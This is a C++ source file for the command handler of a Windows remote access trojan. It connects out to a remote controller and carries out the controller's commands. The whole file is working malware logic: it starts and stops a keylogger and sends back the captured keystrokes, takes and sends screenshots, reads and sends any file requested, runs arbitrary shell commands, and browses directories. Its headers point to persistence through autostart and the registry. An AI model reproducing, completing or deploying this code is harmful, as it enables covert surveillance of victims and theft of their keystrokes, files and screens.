#include <iostream>
#include <WinSock2.h>
#include <fstream>
#include <cstring>
#include "Protocol.h"
#include "struct.h"
#include "screenShot.h"
#include "documentLookUp.h"
#include "reg.h"
#include "autoStartupDir.h"
#include "fileTrans.h"
#include "keylogger.h"
#include "shell.h"
#include "rapidjson/prettywriter.h"
#include "rapidjson/document.h"
#include "rapidjson/istreamwrapper.h"


#pragma comment(lib,"ws2_32.lib")

using namespace std;
using namespace rapidjson;



Protocol::Protocol(std::string ip, int port)
{
	IPAddress = ip;
	TargetPort = port;
	Connected = false;
	position = "C:\\";
}

bool Protocol::Connect()
{
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA wsaData;
	if (WSAStartup(sockVersion, &wsaData) != 0) {
		return false;
	}
	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (Socket == INVALID_SOCKET) {
		return false;
	}


	sockaddr_in RemoteAddr;
	RemoteAddr.sin_family = AF_INET;
	RemoteAddr.sin_port = htons(TargetPort);
	RemoteAddr.sin_addr.S_un.S_addr = inet_addr(IPAddress.c_str());


	if (connect(Socket, (sockaddr*)&RemoteAddr, sizeof(RemoteAddr)) == SOCKET_ERROR) {
		closesocket(Socket);
		return false;
	}

	Connected = true;
	return Connected;
}

bool Protocol::Disconnect()
{
	if (Connected) {
		cout << "disconnect";
		closesocket(Socket);
		Connected = false;
		return true;
	}
	return true;
}

bool Protocol::Ping(std::string Info)
{
	if (Connected) {
		char packet[100];
		send(Socket, "PING", 8, 0);
		//struct_pack(packet, "iii",1,Info.length(),Info.c_str());
		//send(Socket, packet, 18, 0);
		read(8, buf);
		buf[8] = 0;
		if (strcmp(buf, "PONG") == 0) {
			cout << "PONG";
			return true;
		}
		return false;
	}
	return false;
}



void Protocol::run()
{
	while (1) {
		RequestPacket p = GetNextPacket();
		analyseRequests(p);
		if (Connected == false) {
			break;
		}
	}
}

RequestPacket Protocol::GetNextPacket()
{
	RequestPacket req;
	int ParamsCount;
	read(16, buf);
	struct_unpack(buf, "iiii", &req.PacketID, &req.TotalLength, &req.MethodID, &ParamsCount);
	for (int i = 0; i < ParamsCount; i++) {
		Param p;
		int length;
		read(4, buf);
		struct_unpack(buf, "i", &length);
		read(length, buf);
		buf[length] = 0;
		p.Name = std::string(buf);

		read(4, buf);
		struct_unpack(buf, "i", &length);
		read(length, buf);
		buf[length] = 0;
		p.Content = std::string(buf);

		req.Params.push_back(p);
	}
	return req;
}

ResponsePacket Protocol::GenerateResponse(int PacketID, int StatusCode, std::string Content)
{
	ResponsePacket resp;
	resp.PacketID = PacketID;
	resp.StatusCode = StatusCode;
	resp.TotalLength = 4 * 3 + Content.length();
	resp.Content = Content;
	return resp;
}

void Protocol::read(int length, char* buf)
{
	int curr = 0;
	do {
		int result = recv(Socket, &buf[curr], length - curr, 0);
		if (result == -1) {
			return;
		}
		else if (result == 0) {
			return;
		}
		else {
			curr += result;
		}
	} while (curr < length);
	buf[length] = 0;
}

bool Protocol::sendPacket(ResponsePacket resp)
{
	char prefix[12];
	struct_pack(prefix, "iii", resp.PacketID, resp.StatusCode, resp.TotalLength);
	send(Socket, prefix, 12, 0);
	send(Socket, resp.Content.c_str(), resp.Content.length(), 0);
	return true;
}

void Protocol::analyseRequests(RequestPacket req) {
	char scDir[400] = { 0 };
	switch (req.MethodID) {
	case 1:
		//disconnect
		sendPacket(GenerateResponse(req.PacketID, 401, ""));
		cout << "¶Ï¿ª" << endl;
		Disconnect();
		break;


	case 2:
		//keylogger
		if (req.Params[0].Content == "start") {
			keyLoggerMain();
			sendPacket(GenerateResponse(req.PacketID, 203, "keyloggerStart"));
		}
		else if (req.Params[0].Content == "update") {
			char szDir[100] = { 0 };
			strcpy_s(szDir, getenv("TEMP"));
			strcat_s(szDir, "\\.log.sys");
			ifstream ifs;
			ifs.open(szDir, ios::in);
			string key;
			for (string s; getline(ifs, s);)
				key.append(s);
			sendPacket(GenerateResponse(req.PacketID, 203, key));
			updateKeyLogging();
		}
		else {
			StopKeyLogging();
			sendPacket(GenerateResponse(req.PacketID, 204, "keyloggerStop"));
		}
		break;




	case 3:
		//screen shot
	
		strcpy_s(scDir, getenv("TEMP"));
		strcat_s(scDir, "\\sc.jpeg");
		screenshot(scDir);
		sendPacket(GenerateResponse(req.PacketID, 202, readFile(scDir)));
		break;


	case 4:
		//get file
		sendPacket(GenerateResponse(req.PacketID, 202, readFile(req.Params[0].Content)));
		break;

	case 6:
		sendPacket(GenerateResponse(req.PacketID, 202, getCMD((char*)req.Params[0].Content.c_str())));
		break;
	case 5:
		//get file preview
		DOC_LIST docList;
		DOC_LIST* docListPtr = &docList;
		position = (char*)req.Params[0].Content.c_str();
		travelDoc((char*)req.Params[0].Content.c_str(), docListPtr);
		DOC_LIST::iterator d;
		rapidjson::StringBuffer strBuf;
		rapidjson::Writer<rapidjson::StringBuffer> writer(strBuf);
		writer.StartObject();
		writer.Key("position");
		writer.String(position);
		writer.Key("fileInfo");
		writer.StartArray();
		for (d = docList.begin(); d != docList.end(); d++) {
			writer.StartObject();
			writer.Key("Name");
			writer.String(d->name);
			writer.Key("attrib");
			if ((int)(d->attrib & 0x10) == 0x10) {
				writer.String("folder");
			}
			else {
				writer.String("file");
			}
			writer.EndObject();
		}
		writer.EndArray();
		writer.EndObject();
		string data = strBuf.GetString();
		cout << data << endl;
		sendPacket(GenerateResponse(req.PacketID, 202, data));
		break;
	}

}

